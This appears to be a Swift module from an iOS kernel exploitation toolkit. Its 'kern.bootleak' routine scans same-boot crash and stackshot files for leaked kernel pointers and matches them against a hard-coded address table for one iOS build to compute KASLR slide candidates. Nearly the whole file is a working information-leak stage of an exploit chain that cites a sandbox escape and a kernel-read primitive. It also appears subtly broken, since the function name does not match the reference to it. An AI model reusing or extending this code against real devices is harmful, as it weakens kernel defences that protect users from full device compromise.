import Foundation
import Darwin

// MARK: - kern.bootleak — same-boot kernel-address file scan (Tier 0 read lane)
//
// The X-Sandbox read escape + the launchd/crash tools enumerate and dump
// files; this tool is the one that looks for CURRENT-BOOT KERNEL ADDRESSES
// in whatever is readable. Files written during THIS boot (stackshots,
// spin logs, watchdog/stackshot-class .ips) carry kernel frame pointers
// of the running kernel: qword = static_VA + slide. Every static VA in
// the table below is Ghidra-PROVEN on 23F77 (findings:
// ios-xnu-hunt/findings/2026-11-19_23f77_cs2_chain_offset_verify.md).
//
// HONESTY LAW (unchanged): this is a CLASSIFICATION AID. Knowing the slide
// is NOT hasKread — the gate stays kread32(kbase)==0xfeedfacf through a
// real primitive. The second product is the ANCHOR CROSS-CHECK: same-boot
// board anchors that appear inside readable system files identify which
// harvested "anchors" point at persistent kernel objects vs boot-noise.
//
// SKU GATE: the static table is 23F77-only (iPhone13,* + 23F*). On any
// other SKU the scan still enumerates + classifies kernel-range qwords
// but computes NO slide candidates (the P007 law: IDENT always prints,
// kernel-VA math holds when the table has no row).

extension Catalog {

    static var kernFiles: [ExploitModule] {
        let m: ExploitModule = ExploitModule(
            id: "kern.bootleak",
            titleZh: "同 boot 文件内核地址扫描（分类辅助，非 hasKread）",
            cve: "—",
            component: "SandboxExtension · same-boot file scan",
            primitive: .probe,
            reach: .kernel,
            tier: 1,
            summaryZh: "枚举本 boot 写出的可读文件（CrashReporter / diagnostics / Stackshots / var/logs），只保留 mtime ≥ kern.boottime 的同 boot 文件，扫 8 字节对齐 qword 里的内核范围地址，用 23F77 已证明的静态 VA 表推候选 slide（多对一致才算数），并做 board anchor 交叉核对（哪些 anchor 指向持久内核对象、哪些是 boot 噪声）。诚实边界：slide 不是 hasKread，门槛仍是 kread32(kbase)==0xfeedfacf。",
            notesZh: "被拒绝的目录只报 verdict，不猜文件名。一次 TAP；纯读，不写任何容器外路径。",
            run: kernBootleakRun)
        return [m]
    }

    // The Ghidra-PROVEN 23F77 static table (2026-11-19). NEVER paste across SKUs.
    private static let statics23F77: [UInt64] = [
        0xFFFFFFF007004000,      // __TEXT base (research == release)
        0xFFFFFFF007B6EB30,      // kernproc
        0xFFFFFFF009E18728,      // kalloc_data
        0xFFFFFFF009E1900C,      // kfree_data
        0xFFFFFFF009E191D8,      // kalloc_type
        0xFFFFFFF00A0D1000,      // necp_set_socket_attribute
        0xFFFFFFF00A170C10,      // ip_input
        0xFFFFFFF00A15B4D8,      // in_pcballoc
        0xFFFFFFF00A34C9B8,      // sorele
    ]

    private static func isKernelRange(_ q: UInt64) -> Bool {
        // the phys_oob classifier bands (23F77 audit 2026-11-15):
        // static text/data 0xfffffff0.., kernel heap 0xfffffe00../0xffffffe0..
        (q >> 36) == 0xFFFFFFF0 || (q >> 32) == 0xFFFFFE00 || q >= 0xFFFFFE0000000000
    }

    private static func sysctlString(_ name: String) -> String {
        var size: size_t = 0
        guard sysctlbyname(name, nil, &size, nil, 0) == 0, size > 0 else { return "" }
        var buf = [CChar](repeating: 0, count: size)
        guard sysctlbyname(name, &buf, &size, nil, 0) == 0 else { return "" }
        return String(cString: buf)
    }

    private static func kernBootLeakRun(_ ctx: RunContext) throws -> ModuleOutcome {
        ctx.arm("kern.bootleak", "same-boot kernel-address file scan")
        var lines: [String] = []
        let stamp = LabLocalMilitaryNow()
        lines.append("=== kern.bootleak session \(stamp) BUILD kern-bootleak-v1 ===")

        // ---- IDENT + SKU gate ----
        var uts = utsname()
        uname(&uts)
        let machine = withUnsafeBytes(of: &uts.machine) { raw in
            String(decoding: raw.prefix(while: { $0 != 0 }), as: UTF8.self)
        }
        let osv = sysctlString("kern.osversion")
        let release = sysctlString("kern.osrelease")
        lines.append("machine=\(machine) osversion=\(osv) release=\(release)")
        let skuMatch = machine.hasPrefix("iPhone13,") && osv.hasPrefix("23F")
        if !skuMatch {
            lines.append("[hold] static VA table is 23F77-only — enumeration + kernel-range")
            lines.append("       classification run WITHOUT slide candidates (the P007 law).")
        }

        // ---- kern.boottime ----
        var tv = timeval(tv_sec: 0, tv_usec: 0)
        var tvSize = MemoryLayout<timeval>.size
        guard sysctlbyname("kern.boottime", &tv, &tvSize, nil, 0) == 0 else {
            ctx.fail("kern.bootleak", "kern.boottime unreadable")
            throw LabError(message: "kern.boottime unreadable — same-boot filter impossible")
        }
        let bootDate = Date(timeIntervalSince1970: TimeInterval(tv.tv_sec))
        lines.append("boottime=\(Int(tv.tv_sec)) (\(bootDate))")

        // ---- enumerate candidate dirs (direct first; denied dirs get a verdict row) ----
        let dirs = [
            "/var/mobile/Library/Logs/CrashReporter",   // mobile-owned: direct
            "/var/db/diagnostics",                      // root-owned: likely denied
            "/var/db/Stackshots",                       // root-owned: likely denied
            "/var/logs",
            "/var/mobile/Library/Logs",
        ]
        let fm = FileManager.default
        let sizeCap = 32 * 1024 * 1024
        var sameBoot: [(String, Date)] = []
        for dir in dirs {
            let names = (try? fm.contentsOfDirectory(atPath: dir)) ?? []
            if names.isEmpty {
                lines.append("[dir] \(dir) — not listable from the app (\(fm.isExecutableFile(atPath: dir) ? "empty" : "denied/no-traverse"))")
                continue
            }
            var recent = 0
            for name in names.prefix(400) {
                let p = (dir as NSString).appendingPathComponent(name)
                let mtime = (try? fm.attributesOfItem(atPath: p)[.modificationDate] as? Date) ?? nil
                guard let mt = mtime, mt >= bootDate else { continue }
                recent += 1
                if sameBoot.count < 64 { sameBoot.append((p, mt)) }
            }
            lines.append("[dir] \(dir) — \(names.count) entries, \(recent) same-boot")
        }
        if sameBoot.isEmpty {
            lines.append("[-] no same-boot readable files — nothing to scan. The")
            lines.append("    root-owned dirs need the p116 lister (v2 dir listing)")
            lines.append("    + world-readable children; report stands as the reach map.")
            let body = lines.joined(separator: "\n")
            _ = ctx.write("kern_bootleak", Data(body.utf8))
            return ModuleOutcome(headline: "no same-boot readable files (reach map only)", detail: body)
        }

        // ---- scan the same-boot files for kernel-range qwords ----
        var kqCounts: [UInt64: Int] = [:]
        var totalKQ = 0
        var scanned = 0
        for (path, _) in sameBoot {
            guard let data = try? Data(contentsOf: URL(fileURLWithPath: path)),
                  !data.isEmpty, data.count <= sizeCap else { continue }
            scanned += 1
            data.withUnsafeBytes { (raw: UnsafeRawBufferPointer) in
                let n = raw.count / 8
                for i in 0..<min(n, 4_000_000) {
                    let q = raw.loadUnaligned(fromByteOffset: i * 8, as: UInt64.self)
                    if isKernelRange(q) {
                        totalKQ += 1
                        /* distinct-value table is capped: a huge file could
                           otherwise grow the dictionary into the hundreds of
                           thousands; the slide/anchor math only needs the
                           frequent values. */
                        if kqCounts.count < 4096 || kqCounts[q] != nil {
                            kqCounts[q, default: 0] += 1
                        }
                    }
                }
            }
        }
        lines.append("[scan] \(scanned) same-boot files scanned — \(totalKQ) kernel-range qwords (\(kqCounts.count) distinct)")

        // ---- anchor cross-check (which board anchors are persistent kernel objects?) ----
        var anchors = [UInt64](repeating: 0, count: 8)
        let anchorN = LabHeapAnchorsSameBoot(8, &anchors)
        lines.append("[anchor] same-boot board anchors: \(anchorN) distinct")
        for i in 0..<min(anchorN, 8) where anchors[i] != 0 {
            let a = anchors[i]
            let inKernel = isKernelRange(a)
            let inFiles = kqCounts[a] ?? 0
            lines.append("  anchor 0x\(String(a, radix: 16)) kernel-range=\(inKernel) appears-in-files=\(inFiles)")
        }

        // ---- slide candidates (23F77 table only; agreement across pairs) ----
        if skuMatch && !kqCounts.isEmpty {
            var deltas: [UInt64: Int] = [:]
            for (q, c) in kqCounts {
                for s in Catalog.statics23F77 {
                    let d = q &- s
                    // slide: positive, < 1 GiB, 16 KiB page-aligned (A14)
                    if d > 0 && d < 0x4000_0000 && (d & 0x3FFF) == 0 {
                        deltas[d, default: 0] += c
                    }
                }
            }
            let top = deltas.sorted { $0.value > $1.value }.prefix(5)
            lines.append("[slide] candidates (delta agreement across qword×static pairs):")
            if top.isEmpty || top.first!.value < 3 {
                lines.append("  none with agreement ≥ 3 — honest: no slide claim this pass")
            } else {
                for (d, c) in top {
                    lines.append("  candidate slide 0x\(String(d, radix: 16)) (agreement \(c))")
                }
            }
        }

        // ---- honesty stamp ----
        lines.append("=== verdict ===")
        lines.append("CLASSIFICATION AID ONLY. slide candidates/anchor provenance are NOT")
        lines.append("hasKread. The gate stays kread32(kbase)==0xfeedfacf through a real")
        lines.append("primitive (cs2/p177). Read-only; nothing written outside the container.")

        let body = lines.joined(separator: "\n")
        _ = ctx.write("kern_bootleak", Data(body.utf8))
        let head = totalKQ > 0
            ? "\(totalKQ) kernel-range qwords in \(scanned) same-boot files"
            : "no kernel-range qwords in \(scanned) same-boot files"
        return ModuleOutcome(headline: head, detail: body)
    }
}
